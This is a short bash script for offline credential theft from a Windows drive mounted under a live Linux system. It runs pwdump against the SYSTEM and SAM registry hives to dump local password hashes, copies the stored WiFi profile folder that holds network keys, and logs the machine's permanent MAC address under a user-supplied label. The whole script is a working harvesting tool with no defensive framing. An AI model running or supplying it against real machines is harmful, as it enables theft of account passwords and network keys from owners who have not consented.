#!/usr/bin/env bash
home=$(pwd)
cd data
lognumber=$(ls | wc -l)
#mkdir if dir doesnt exist
mkdir -p ${lognumber}

cd ..
store=${home}"/data/${lognumber}"


hashfile="${store}/log.txt"
echo "**In updated Windows versions, hashes are likely null.**"

echo "##############" >> ${hashfile}
echo "Label (arg1): ${1}" >> ${hashfile}
macchanger -s wlan0 | grep "Permanent" >> ${hashfile}

cd /media/root/OS/Windows/System32/config
pwdump SYSTEM SAM >> ${hashfile}
cd $home

cp -R /media/root/OS/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces $store"/wifi/"

cat $hashfile
